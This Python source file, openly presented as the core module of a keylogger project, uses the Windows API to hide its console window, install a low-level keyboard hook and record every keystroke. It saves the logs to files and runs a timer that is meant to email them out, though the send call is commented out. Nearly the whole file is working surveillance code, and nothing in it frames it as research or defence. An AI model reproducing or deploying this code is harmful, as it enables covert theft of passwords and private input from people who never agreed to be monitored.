'''
THE CORE OF THE PROJECT
This module will take care about tracking the keyboard strokes
encrypting and loggin them + sending the files over the emails
'''

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG

import Io,Mailer,Helper,Timer,Keys

# the required libraries
user32 = windll.user32
kernel32 = windll.kernel32

# Hiding the console when running
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console
# required constants for win api functions
WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# callback function type declaration for c
HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) 
# class to handle information about keyboard input event
class KBDLLHOOKSTRUCT(Structure):
	_fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]
# The global variable that will contains the captured hooks
keylogs = ""

# the mailing func : check if there is logged keys then send mail and check if mail was sended
def mail_func():

    global keylogs
    print('running mail_func with ',keylogs)
    if(keylogs.isspace() or keylogs == ''):
        return None
    name,path = Io.saveKeys(keylogs)

    if(name!=1):
        # uncomment to activate the sending mail feature
        #mail_result = Mailer.send_mail(f'Log [{name}]','File attached',path)
        pass
        '''if(mail_result !=7):
            Io.logEvent("<Email error>: code = {mail_result}")
        else: keylogs=""
        '''

# our timer to be used for mail sending function
mail_timer = Timer.timer(mail_func,60)

# the hook process (which will be executed in every signal call for a key stroke)
def hook_proc(nCode, wParam, lParam):
    global keylogs
    if nCode == HC_ACTION and wParam == WM_KEYDOWN:
        
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
        if n > 0:

            # Avoid logging weird characters. If they show up,
            for key in Keys.KEYS.keys(): 
                if kb.vkCode == key:
                    keylogs += Keys.KEYS[key][1]

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

# Hook class
class Hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.
        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.
        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        # uncomment to start the mailing feature
        mail_timer.start()
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None


hook = Hook()                      # Hook class
ptr = HOOKPROC(hook_proc)          # Pointer to the callback function
